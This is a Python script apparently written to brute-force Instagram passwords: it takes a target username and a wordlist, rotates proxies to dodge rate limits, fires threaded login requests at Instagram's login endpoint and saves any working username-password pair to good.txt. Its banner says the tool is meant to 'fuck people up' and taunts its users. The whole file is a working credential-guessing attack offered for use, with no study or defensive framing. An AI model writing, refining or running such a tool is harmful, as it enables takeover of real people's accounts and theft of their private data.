from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
import json
from colorama import Fore
CheckVersion = str(sys.version)
import re
from datetime import datetime

normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"
onlyPasswords = False



print('''
                               ,           ,
 /             \
((__-^^-,-^^-__))
 `-_---' `---_-'
  <__|o` 'o|__>
     \  `  /
      ): :(
      :o_o:
       "-" 
       """
Sometimes you have to cut the grass to see the snake.

I'm going back on m quiet shit i been too loud lately.

Stay real,stay loyal or stay the fuck away from me.

Falling down is an accident staying down is a choice.


''')

print ('''
====================================================================================================================
[developer_instgram] => dasistrj
[developer_tool] => this tool is to fuck people up
[developer_better version] => follow me to get better version
by the way it will not allways work if the password is not in the list so add your own you fool in the pass.txt file
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
''')

class InstaBrute(object):
    def __init__(self):

        try:
            user = input('username : ')
            Combo = input('passList : ')
            self.CurrentProxy = ''
            self.UsedProxys = []
            UsePorxy = input('[*] Do you want to use proxys or you want to use me just say yes (y/n): ').upper()
            if (UsePorxy == 'Y' or UsePorxy == 'YES'):
                self.randomProxy()

            print('\n----------------------------')

        except:
            print(' The tool was kidnapped exit now jk ')
            sys.exit()

        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password))
            t.start()
            thread.append(t)
            time.sleep(0.9)
        for j in thread:
            j.join()

    def randomProxy(self):
        plist = open('proxy.txt').read().splitlines()
        proxy = random.choice(plist)

        if not proxy in self.UsedProxys:
            self.CurrentProxy = proxy
            self.UsedProxys.append(proxy)
        while 1:
            try:
                print('')
                print(normal_color+'[*] Check new ip...')
                response = requests.get('https://api.ipify.org/?format=raw', proxies={"http": proxy, "https": proxy},
                                        timeout=10.0).text
                if re.match(r'((?:\d{1,3}\.){3}\d{1,3})', response) != None:
                    print(whiteB_color + '[*] Your public ip haa i got it just kiding: %s' % response)
                    print('')
                    break
                else:
                    continue
                # if response.rtrim().ltrim() == "HTTP/1.1 400 Bad Request":
                #     raise Exception("Can not reach proxys damm go buy some kid")
                # else:
                #     break
            except Exception as e:
                print('[*] Can\'t reach proxy "%s"' % proxy)
                proxy = random.choice(plist)
               
            print('')
			

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def New_Br(self, user, pwd):
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
            })

            
            data = json.loads(r.text)
            if 'message' in r.text:
                print('----------------------------')
                print(red_color+'--> not proxy ich bin das man')
                UsePorxy = self.randomProxy()
                print (whiteB_color + 'username: '+ user + ' | '' password: '+ pwd )
                print(r.text)
                print('----------------------------')
            if 'checkpoint_url' in r.text:
                print((normal_color+'' + user + ':' + pwd + ' --> Good hack you got the password kid'))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
                    exit()					
            if 'userId' in r.text:
                print((normal_color+'' + user + ':' + pwd + ' --> Good hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
                    exit()
            elif 'status' in r.text:
                print (red_color + 'username: '+ user + ' | '' password: '+ pwd )
                print(r.text)


  




InstaBrute()